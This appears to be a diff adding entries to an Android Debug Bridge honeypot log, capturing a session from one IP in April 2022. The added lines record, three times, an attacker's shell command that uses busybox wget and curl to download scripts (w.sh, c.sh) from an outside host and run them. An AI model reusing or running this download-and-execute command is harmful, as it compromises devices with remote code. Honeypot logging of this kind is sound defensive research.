@@ -336,3 +336,12 @@
 2022-04-30 08:00:44,885 - 140064246958904 - ADBHoneypot - INFO - data is none?: None
 2022-04-30 08:00:48,485 - 140064246958904 - ADBHoneypot - INFO - 114.26611328125	210.111.180.54	connection closed
 2022-04-30 08:00:52,093 - 140064246958904 - ADBHoneypot - INFO - {'eventid': 'adbhoney.session.closed', 'src_ip': '210.111.180.54', 'duration': '114.27', 'timestamp': '2022-04-30T07:58:43.433420Z', 'unixtime': 1651305524, 'session': '932a14b82b87', 'sensor': 'honeypot01'}
+2022-04-30 09:02:56,050 - 140064246958904 - ADBHoneypot - INFO - Received a connection, creating an ADBConnection.
+2022-04-30 09:29:06,888 - 140064246958904 - ADBHoneypot - INFO - 45.154.96.76 connection start (84cce27cdaf1)
+2022-04-30 09:29:07,229 - 140064246958904 - ADBHoneypot - INFO - {'eventid': 'adbhoney.session.connect', 'src_ip': '45.154.96.76', 'src_port': 53230, 'dest_ip': '172.18.0.2', 'dest_port': '5555', 'timestamp': '2022-04-30T09:29:06.888673Z', 'unixtime': 1651310946, 'session': '84cce27cdaf1', 'sensor': 'honeypot01'}
+2022-04-30 09:29:07,387 - 140064246958904 - ADBHoneypot - INFO - shell command is cd /data/local/tmp/; busybox wget http://209.141.34.115/w.sh; sh w.sh; curl http://209.141.34.115/c.sh; sh c.sh, len 111
+2022-04-30 09:29:07,387 - 140064246958904 - ADBHoneypot - INFO - 45.154.96.76	b'shell:cd /data/local/tmp/; busybox wget http://209.141.34.115/w.sh; sh w.sh; curl http://209.141.34.115/c.sh; sh c.sh'
+2022-04-30 09:29:07,387 - 140064246958904 - ADBHoneypot - INFO - {'eventid': 'adbhoney.command.input', 'input': 'cd /data/local/tmp/; busybox wget http://209.141.34.115/w.sh; sh w.sh; curl http://209.141.34.115/c.sh; sh c.sh', 'src_ip': '45.154.96.76', 'timestamp': '2022-04-30T09:29:07.184729Z', 'unixtime': 1651310947, 'session': '84cce27cdaf1', 'sensor': 'honeypot01'}
+2022-04-30 09:29:08,201 - 140064246958904 - ADBHoneypot - INFO - data is none?: None
+2022-04-30 09:29:08,201 - 140064246958904 - ADBHoneypot - INFO - 477.50605940818787	45.154.96.76	connection closed
+2022-04-30 09:29:08,201 - 140064246958904 - ADBHoneypot - INFO - {'eventid': 'adbhoney.session.closed', 'src_ip': '45.154.96.76', 'duration': '477.51', 'timestamp': '2022-04-30T09:29:08.201366Z', 'unixtime': 1651310948, 'session': '84cce27cdaf1', 'sensor': 'honeypot01'}
